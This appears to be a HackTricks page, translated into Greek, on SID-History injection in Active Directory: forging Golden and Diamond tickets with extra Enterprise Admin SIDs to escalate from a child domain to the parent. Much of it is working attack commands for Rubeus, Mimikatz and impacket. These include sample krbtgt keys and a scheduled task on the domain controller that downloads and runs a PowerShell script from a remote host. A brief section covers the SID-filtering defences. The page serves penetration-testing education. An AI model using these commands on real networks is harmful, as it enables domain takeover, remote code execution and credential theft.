# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Ο στόχος της **Επίθεσης Εισαγωγής Ιστορικού SID** είναι η βοήθεια **μεταφοράς χρηστών μεταξύ τομέων** ενώ διασφαλίζεται η συνεχής πρόσβαση σε πόρους από τον πρώην τομέα. Αυτό επιτυγχάνεται με **την ενσωμάτωση του προηγούμενου Αναγνωριστικού Ασφαλείας (SID) του χρήστη στο Ιστορικό SID** του νέου του λογαριασμού. Σημαντικά, αυτή η διαδικασία μπορεί να παραποιηθεί για να παραχωρήσει μη εξουσιοδοτημένη πρόσβαση προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από τον γονικό τομέα στο Ιστορικό SID. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του γονικού τομέα.

Δύο μέθοδοι υπάρχουν για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.

Για να προσδιορίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να εντοπίσετε το SID του ριζικού τομέα. Αφού γίνει η αναγνώριση, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας `-519` στο SID του ριζικού τομέα. Για παράδειγμα, αν το SID του ριζικού τομέα είναι `S-1-5-21-280534878-1496970234-700767426`, το αποτέλεσμα SID για την ομάδα "Enterprise Admins" θα ήταν `S-1-5-21-280534878-1496970234-700767426-519`.

Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, οι οποίες τελειώνουν σε **512**.

Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας του άλλου τομέα (για παράδειγμα "Domain Admins") είναι με:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Σημειώστε ότι είναι δυνατόν να απενεργοποιήσετε την ιστορία SID σε μια σχέση εμπιστοσύνης, γεγονός που θα αποτύχει αυτή την επίθεση.

Σύμφωνα με τα [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
- **Απενεργοποίηση της SIDHistory σε δασικές εμπιστοσύνες** χρησιμοποιώντας το εργαλείο netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Εφαρμογή SID Filter Quarantining σε εξωτερικές εμπιστοσύνες** χρησιμοποιώντας το εργαλείο netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Εφαρμογή SID Filtering σε εμπιστοσύνες τομέα εντός ενός μόνο δάσους** δεν συνιστάται καθώς είναι μια μη υποστηριζόμενη διαμόρφωση και μπορεί να προκαλέσει σοβαρές αλλαγές. Εάν ένας τομέας εντός ενός δάσους είναι αναξιόπιστος, τότε δεν θα πρέπει να είναι μέλος του δάσους. Σε αυτή την περίπτωση, είναι απαραίτητο πρώτα να διαχωριστούν οι αξιόπιστοι και οι αναξιόπιστοι τομείς σε ξεχωριστά δάση όπου μπορεί να εφαρμοστεί το SID Filtering σε μια διασυνοριακή εμπιστοσύνη.

Δείτε αυτή την ανάρτηση για περισσότερες πληροφορίες σχετικά με την παράκαμψη αυτού: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Την τελευταία φορά που το δοκίμασα, χρειάστηκε να προσθέσω το arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) με KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Για περισσότερες πληροφορίες σχετικά με τα golden tickets, ελέγξτε:

{{#ref}}
golden-ticket.md
{{#endref}}


Για περισσότερες πληροφορίες σχετικά με τα diamond tickets, ελέγξτε:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Αναβάθμιση σε DA του root ή Enterprise admin χρησιμοποιώντας το hash KRBTGT του παραβιασμένου τομέα:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Με τις αποκτηθείσες άδειες από την επίθεση μπορείτε να εκτελέσετε, για παράδειγμα, μια επίθεση DCSync στο νέο τομέα:

{{#ref}}
dcsync.md
{{#endref}}

### Από linux

#### Χειροκίνητα με [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Αυτό είναι ένα σενάριο Impacket που θα **αυτοματοποιήσει την αναβάθμιση από το παιδικό στο γονικό domain**. Το σενάριο χρειάζεται:

- Στοχοθετημένος ελεγκτής τομέα
- Διαπιστευτήρια για έναν διαχειριστή χρήστη στο παιδικό domain

Η ροή είναι:

- Αποκτά το SID για την ομάδα Enterprise Admins του γονικού domain
- Ανακτά το hash για τον λογαριασμό KRBTGT στο παιδικό domain
- Δημιουργεί ένα Golden Ticket
- Συνδέεται στο γονικό domain
- Ανακτά διαπιστευτήρια για τον λογαριασμό Administrator στο γονικό domain
- Εάν έχει καθοριστεί η επιλογή `target-exec`, αυθεντικοποιείται στον Ελεγκτή Τομέα του γονικού domain μέσω Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Αναφορές

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
